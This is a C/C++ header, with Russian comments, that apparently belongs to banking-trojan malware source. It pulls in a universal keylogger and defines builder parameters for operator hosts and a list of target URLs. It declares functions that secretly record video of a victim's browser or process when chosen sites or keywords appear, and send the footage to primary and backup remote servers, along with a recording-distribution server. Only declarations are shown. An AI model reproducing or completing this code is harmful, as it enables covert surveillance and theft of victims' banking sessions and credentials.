#ifndef VideoRecorderH
#define VideoRecorderH
//-----------------------------------------------------------------------------

#include <windows.h>
#include "UniversalKeyLogger.h"


// Настройки парметров для билдера
#define VIDEOREC_PARAM_SIZE_HOST 50
#define VIDEOREC_PARAM_SIZE_URLS 3000

#define VIDEOREC_PARAM_NAME_HOST1 "VIDEO_REC_HOST1"
#define VIDEOREC_PARAM_NAME_HOST2 "VIDEO_REC_HOST2"
#define VIDEOREC_PARAM_NAME_URLS  "VIDEO_REC_URLS\0"

#define VIDEOREC_PARAM_ENCRYPTED_HOST false
#define VIDEOREC_PARAM_ENCRYPTED_URLS false



void StartRecordThread(DWORD pid, PCHAR KeyWord, PCHAR ip, PCHAR ReservedIP, int port);//стартуем поток записи видео
void StartRecordThread1(HWND hWnd,PCHAR KeyWord,PCHAR ip, PCHAR ReservedIP, int port);//стартуем поток записи видео
void StopRecordThread();//останавливаем поток записи видео
void StartSendThread(PCHAR Path,PCHAR ip, PCHAR ReservedIP, int port);//подгружаем длл и вызываем из нее ф-цию

//шлем либо просто либо передавая функцию в поток, параметр для которого директория
void StartFindFields();
DWORD WINAPI StartSendinThread(LPVOID Data);

//Функция возвращает адрес сервера для записи видео
PCHAR GetVideoRecHost1();
PCHAR GetVideoRecHost2();

//void WINAPI IEURLChanged(PKeyLogger Logger, DWORD EventID, LPVOID Data);

void StartVideoFromCurrentURL();




//*********************************************************************
//  Методы сервера распределения записи видео
//  Назначение сервера - запись видео процесса из другого
//  специолизированного процесса
//*********************************************************************
namespace VideoRecorderSrv
{
	//-----------------------------------------------------
	// Start - Функция запускает сервер распределения
	//-----------------------------------------------------
	bool Start();

	//-----------------------------------------------------
	// StartRecording - Функция стартует запуск записи
	//					видео для текущего процесса
	//
	// URL - адрес сайт для которого инициализирована запись.
	//-----------------------------------------------------
	bool StartRecording(PCHAR URL);

	//-----------------------------------------------------
	// StopRecording - Функция останавливает запуск записи
	//					видео для текущего процесса
	//-----------------------------------------------------
	bool StopRecording();

	//-----------------------------------------------------
	//  PingClient - Функция проверяет работает ли
	//               клиент записи с указанным PID
	//	Если PID равен 0 то будет проверяться текущий
	//  процесс
	//-----------------------------------------------------
	bool PingClient(DWORD PID);
}

//-----------------------------------------------------------------------------
#endif